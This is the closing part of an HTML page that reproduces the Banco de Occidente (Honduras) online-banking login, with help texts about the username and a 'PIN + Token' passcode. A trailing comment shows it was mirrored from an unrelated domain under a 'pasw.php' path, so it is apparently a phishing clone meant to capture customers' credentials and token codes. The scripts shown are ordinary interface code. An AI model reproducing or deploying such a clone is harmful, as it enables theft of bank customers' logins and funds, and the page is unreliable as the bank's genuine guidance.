style="position: absolute; min-height: 30px; top: 0px; height: 0px;"><div class="mCSB_dragger_bar" style="line-height: 30px;"></div></div><div class="mCSB_draggerRail"></div></div></div></div></div></div><div id="mCSB_7_scrollbar_vertical" class="mCSB_scrollTools mCSB_7_scrollbar mCS-light mCSB_scrollTools_vertical" style="display: none;"><div class="mCSB_draggerContainer"><div id="mCSB_7_dragger_vertical" class="mCSB_dragger" style="position: absolute; min-height: 30px; top: 0px; height: 0px;"><div class="mCSB_dragger_bar" style="line-height: 30px;"></div></div><div class="mCSB_draggerRail"></div></div></div></div></div></div></div><div class="item active"><div class="carousel-caption"><div class="mCustomScrollbar _mCS_8 mCS_no_scrollbar"><div id="mCSB_8" class="mCustomScrollBox mCS-light mCSB_vertical mCSB_inside" tabindex="0" style="max-height: none;"><div id="mCSB_8_container" class="mCSB_container mCS_y_hidden mCS_no_scrollbar_y" style="position:relative; top:0; left:0;" dir="ltr"><div class="contenido mCustomScrollbar _mCS_4 mCS_no_scrollbar"><div id="mCSB_4" class="mCustomScrollBox mCS-inset-dark mCSB_vertical mCSB_inside" tabindex="0" style="max-height: none;"><div id="mCSB_4_container" class="mCSB_container mCS_y_hidden mCS_no_scrollbar_y" style="position:relative; top:0; left:0;" dir="ltr"><p class="text-uppercase p-titulo bold text-left"></p><h6> BANCOS HABILITADOS PARA RECIBIR PAGOS DE TARJETAS DE CRÉDITO                                                                  </h6><p></p><hr><p class="text-justify">Estimado cliente le detallamos los bancos que aceptan pagos de TARJETA DE CRÉDITO por medio de la plataforma ACH-Pronto : <br><br>          - Banco Atlántida  <br>                                              - Banco del País (BANPAIS) <br>                                      - Banco Hondureño del Café (BANHCAFE) <br>                           - Banco LAFISE     <br>                                              - Banco PROMERICA  <br>                                              - Banco FICOHSA    <br>                                              - Banco DAVIVIENDA  <br>                                             - Banco BAC CREDOMATIC <br>                                        <br> Los bancos no listados, no reciben este pago por la plataforma de ACH.</p></div><div id="mCSB_4_scrollbar_vertical" class="mCSB_scrollTools mCSB_4_scrollbar mCS-inset-dark mCSB_scrollTools_vertical" style="display: none;"><div class="mCSB_draggerContainer"><div id="mCSB_4_dragger_vertical" class="mCSB_dragger" style="position: absolute; min-height: 30px; top: 0px; height: 0px;"><div class="mCSB_dragger_bar" style="line-height: 30px;"></div></div><div class="mCSB_draggerRail"></div></div></div></div></div></div><div id="mCSB_8_scrollbar_vertical" class="mCSB_scrollTools mCSB_8_scrollbar mCS-light mCSB_scrollTools_vertical" style="display: none;"><div class="mCSB_draggerContainer"><div id="mCSB_8_dragger_vertical" class="mCSB_dragger" style="position: absolute; min-height: 30px; top: 0px; height: 0px;"><div class="mCSB_dragger_bar" style="line-height: 30px;"></div></div><div class="mCSB_draggerRail"></div></div></div></div></div></div></div><div id="pie-boletin" class="modal-footer pie-boletin"><h5 class="text-center"><strong>BANCO DE OCCIDENTE, S.A.</strong> Apoyando al pequeño de hoy, hacemos el grande del mañana.</h5></div></div></div></div><!-- /.carousel -->
                      </div>
                      <!-- FIN ANUNCIOS-->
                      <div id="informacion" class="tab-pane fade">
                            <article id="sec-info">
                               <div class="divContentLogin div-reporte">
                                    <h4>Conoce Occidente en Línea</h4>
                                    <ul class="list-contenido">
                                        <li class="pdf"><i class="fa fa-chevron-right fa-fw" aria-hidden="true"></i><a href="https://www.bancodeoccidente.hn/enlinea/informacion/pdf/primer-ingreso.pdf" class="modalInfo">¿Cómo hacer el primer ingreso?</a></li>
                                        <li><i class="fa fa-chevron-right fa-fw" aria-hidden="true"></i><a href="https://www.bancodeoccidente.hn/enlinea/infor/asistencia.aspx" class="modalInfo">Asistencia y Soporte</a></li>
                                        <li><i class="fa fa-chevron-right fa-fw" aria-hidden="true"></i><a href="https://www.bancodeoccidente.hn/enlinea/infor/horarios.aspx" class="modalInfo">Horarios</a></li>
                                        <li><i class="fa fa-chevron-right fa-fw" aria-hidden="true"></i><a href="https://www.bancodeoccidente.hn/enlinea/infor/faq.aspx" class="modalInfo">Preguntas Frecuentes</a></li>
                                        <li><i class="fa fa-chevron-right fa-fw" aria-hidden="true"></i><a href="https://www.bancodeoccidente.hn/enlinea/infor/solicitudes.aspx" class="modalInfo">Solicitudes y Manuales</a></li>
                                    </ul>
                                </div>
                                <div class="divContentLogin div-solicitud">
                                    <h4>Nuevo Canal OCCIDENTE MÓVIL</h4>
                                    <ul class="list-contenido">
                                        <li><i class="fa fa-chevron-right fa-fw" aria-hidden="true"></i><a href="https://www.bancodeoccidente.hn/enlinea/infor/solicitudesOM.aspx" class="modalInfo">Solicitudes y Manuales</a></li>
                                    </ul>
                                </div>
                                <div class="divContentLogin div-token">
                                    <h4>Token</h4>
                                    <ul class="list-contenido">
                                        <li><i class="fa fa-chevron-right fa-fw" aria-hidden="true"></i><a href="https://www.bancodeoccidente.hn/enlinea/infor/token.aspx" class="modalInfo">¿Qué es el Token?</a></li>
                                        <li><i class="fa fa-chevron-right fa-fw" aria-hidden="true"></i><a href="https://www.bancodeoccidente.hn/enlinea/infor/guiaApoyo.aspx" class="modalInfo">Guía de apoyo del Token</a></li>
                                        <li><i class="fa fa-chevron-right fa-fw" aria-hidden="true"></i><a href="https://www.bancodeoccidente.hn/enlinea/infor/faqToken.aspx" class="modalInfo">Preguntas Frecuentes acerca del Token</a></li>
                                    </ul>
                                </div>
                                
                                <div class="divContentLogin div-advertencia">
                                    <h4 class="redText">Advertencia</h4>
                                    <span>
                                    Por su seguridad Banco de Occidente, S.A. <span class="redText">nunca</span> le pedirá actualizar sus datos a través de correos electrónicos o páginas de Internet. 
                                    </span>
                                     <ul class="list-contenido">
                                        <li><i class="fa fa-chevron-right fa-fw" aria-hidden="true"></i><a href="https://www.bancodeoccidente.hn/enlinea/infor/seguridad.aspx" class="modalInfo">Información sobre Seguridad</a></li>
                                     </ul>
                                 </div>
                                 <div class="divLeftPanelLogin">
                                     <div class="col-md-6">
                                        <a id="veriSignSeal" href="https://seal.verisign.com/splash?form_file=fdf/splash.fdf&amp;dn=www.bancodeoccidente.hn&amp;lang=es" target="_blank"><img class="img-secure-1 img-responsive pull-right" alt="VeriSign" src="index_files/LogoVeriSignSeal.png" title="VeriSign"></a>
                                     </div>
                                      <div class="col-md-6">
                                        <a id="mcAfeeSecure" href="https://www.mcafeesecure.com/RatingVerify?ref=www.bancodeoccidente.hn&amp;lang=ES" target="_blank"><img class="img-secure-2 img-responsive" alt="McAfee Los sitios Secure le ayudan a prevenir robos de identidad, fraudes a través de tarjetas de crédito, software espía, correo no deseado, virus y otras estafas en línea" src="index_files/13.gif"></a>
                                     </div> 
                                     <div class="col-md-12">
                                        <img class="img-secure-3 center-block img-responsive" alt="RSA Secured" src="index_files/RSA_Secured-logo.gif" title="RSA Secured">
                                     </div>
                                </div>
                            </article>
                      </div>

                    </div><!-- tab-content -->
 
                    
                </div><!-- col-md-5 -->

                <!-- Modal informativo-->
               <div id="modalInformativo" class="modal fade background-modal" role="dialog">
                  <div class="modal-dialog modal-dialog-centered modal-lg modal-info">
                     

                    <!-- Modal content-->
                    <div class="modal-content">
                        <!-- ANUNCIOS-->
                        <div id="ctl00_CTBCuerpo_Anuncios" class="anuncio-publicitario"></div><!-- /.carousel -->    
                    </div>          
                  </div>
                </div>

            </div><!-- row -->

            
            <div class="contenido-popover-user hidden">
                <div class="divInfo">
		            <p>El Usuario es la clave que le fué proporcionada cuando usted contrató nuestro servicio de Banca por Internet, es un valor fijo que no cambia en el tiempo y es algo que debe memorizar.</p>
	            </div>
            </div> 
            
            <div class="contenido-popover-pass hidden">
                
                <div class="divInfo">
                    <h3>Passcode = PIN + Token</h3>

                    <img src="index_files/passcode.jpg" alt="Ayuda para ingreso de Passcode" class="ayudaPasscode img-responsive">
                    <p>El Passcode está compuesto por el <strong>PIN</strong> más el <strong>código dinámico del Token</strong>, sin espacios en blanco.</p>
                    <p>Si es la <strong>primera vez</strong> que ingresa a este servicio, 
                    <strong>únicamente ingrese el Token</strong> en la siguiente pantalla usted creará su PIN.</p>
                </div>
            </div> 
            
            <div class="contenido-popover-usuario hidden">
                <div class="divInfo">
		            <p>Le invitamos para que visite nuestras oficinas y firme el contrato que le permitirá hacer uso de los servicios financieros del Banco de Occidente, S.A. en Internet.</p>
		            <p>Es muy sencillo y rápido, para contratar el servicio de Occidente en Línea sólo necesitas:</p>
		            <ul class="list-simple">
			            <li>Contar con una cuenta de Cheques, Ahorros, Depósito a Plazo Fijo o Tarjeta de Crédito de Banco de Occidente, S.A. Si no cuentas con ella, acude a la oficina más cercana para abrir una.</li>
			            <li>Acudir a la oficina de tu preferencia y solicitar el servicio de Occidente en Línea.</li>
			            <li>Presentar tu identificación oficial vigente en original (Tarjeta de Identidad o pasaporte) y firmar el contrato.</li>
		            </ul>
		            <p>Puedes bajar el contrato de servicio y firmarlo en nuestras oficinas:</p>
		            <ul class="list-simple">
			            <li><a href="https://www.bancodeoccidente.hn/enlinea/informacion/pdf/contrato-para-personas-naturales.pdf" class="bold" target="_blank" title="" data-original-title="Contrato para Personas Naturales">Contrato para Personas Naturales</a> (en formato PDF)</li>
			            <li><a href="https://www.bancodeoccidente.hn/enlinea/informacion/pdf/contrato-para-personas-juridicas.pdf" class="bold" target="_blank" title="" data-original-title="Contrato para Personas Jurídicas">Contrato para Personas Jurídicas</a> (en formato PDF)</li>
		            </ul>
		            <p>¡Ahora si! Ya estás listo para disfrutar de la banca del futuro.</p>
	            </div>
            </div> 
               
            <div class="contenido-popover-pin hidden">
                <div class="divInfo">
		            <p>Si olvidó su nombre de <strong>Usuario</strong> contacte con nuestras oficinas o llama a nuestro Call Center para que se lo envíen a la dirección de correo electrónico que ingresaste durante tu Registro.</p>
		            <p>Si olvidó el <strong>PIN</strong> debe presentarse a cualquiera de nuestras oficinas para llenar una solicitud de cambio de PIN.</p>
		            <p>Aunque tenga en cuenta que no le podrán proporcionar dichas claves telefónicamente.</p>
	            </div>
            </div>   
                
            <div class="contenido-popover-token hidden">
                <div class="divInfo">
		            <p>Recuerde que el Token se puede bloquear si hace el ingreso incorrecto tres veces consecutivas de su PIN.</p>
		            <p>Para desbloquearlo llame a nuestro Call Center o contacte con nuestras oficinas para que realicen el desbloqueo.</p>
	            </div>
            </div>     

        
	</div>


                        </div>
      
                    </div>

                    <div class="row row-footer principal">
                        <div class="text-center">
                            <footer class="site-footer">
                                <p class="Copyright">Copyright © 2023 <strong>bancocci.hn</strong> Todos los derechos reservados</p>
                            </footer>
                        </div>
                    </div>
                    
                 </div><!-- footer --> 

            
</div>
    

<script type="text/javascript">
//<![CDATA[
(function() {var fn = function() {$get("ctl00_ToolkitScriptManager1_HiddenField").value = '';Sys.Application.remove_init(fn);};Sys.Application.add_init(fn);})();WebForm_AutoFocus('ctl00_CTBCuerpo_txtUsuario');Sys.Application.initialize();
Sys.Application.add_init(function() {
    $create(Sys.Extended.UI.ModalPopupBehavior, {"BackgroundCssClass":"modalBackground","PopupControlID":"ctl00_pnlProgress","dynamicServicePath":"/enlinea/bLogin.aspx","id":"ctl00_mpeProgress"}, null, null, $get("ctl00_pnlProgress"));
});
//]]>
</script>
</form>

<script type="text/javascript">
    Sys.Net.WebRequestManager.add_invokingRequest(onInvoke);
    //No se Usa:Sys.Net.WebRequestManager.add_completedRequest(onComplete);
    Sys.Application.add_unload(onComplete);
    Sys.Application.add_load(onComplete);

    function onInvoke(sender, args) {
        $find('ctl00_mpeProgress').show();
    }

    function onComplete(sender, args) {
        $find('ctl00_mpeProgress').hide();
    }

    // Si hay TimeExpired Ajax recarga la pagina
    Sys.WebForms.PageRequestManager.getInstance().add_endRequest(EndRequestHandler);
    function EndRequestHandler(sender, args) {
        if (args.get_error() != undefined) {
            args.set_errorHandled(true); location.reload(true);
            //alert(args.get_error().description);
        }
    }

    prm = Sys.WebForms.PageRequestManager.getInstance();
    prm.add_endRequest(EndRequest);

    function EndRequest(sender, args) {
        //alert("EndRequest"); 

        jQuery(document).ready(function () {


            $(".contenido").mCustomScrollbar({ theme: "inset-dark" });

            //carousel login anuncios
            $('#myCarousel').carousel();

            //popover

            $('.popover-big').popover({
                html: true,
                placement: 'top',
                trigger: 'focus',
                content: function () {
                    return $($(this).data('contentwrapper')).html();
                }
            });

            $('.popover-small').popover({
                html: true,
                placement: 'right',
                trigger: 'focus',
                content: function () {
                    return $($(this).data('contentwrapper')).html();
                }
            });

            /*
            *   Modal Dialogs
            */

            $("a#veriSignSeal").fancybox({
                'width': 550,
                'height': 500,
                'autoScale': false,
                'transitionIn': 'none',
                'transitionOut': 'none',
                'titleShow': false,
                'type': 'iframe'
            });

            $("a#mcAfeeSecure").fancybox({
                'width': 600,
                'height': '80%',
                'autoScale': false,
                'transitionIn': 'none',
                'transitionOut': 'none',
                'titleShow': false,
                'type': 'iframe'

            });

            $(".modalInfo").fancybox({
                'width': '80%',
                'height': '80%',
                'autoScale': false,
                'transitionIn': 'none',
                'transitionOut': 'none',
                'modal': true,
                'type': 'iframe'
            });

            $(".modalInfoMini").fancybox({
                'width': 450,
                'height': '50%',
                'autoScale': false,
                'transitionIn': 'none',
                'transitionOut': 'none',
                'titleShow': false,
                'modal': true,
                'type': 'iframe'
            });


        });  // fin

    }
</script>

<script type="text/javascript" src="index_files/_Incapsula_Resource.html" async=""></script>

</body>
<!-- Mirrored from minielectronica.com/occidentehn/pasw.php by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 13 Feb 2023 22:08:00 GMT -->
</html>
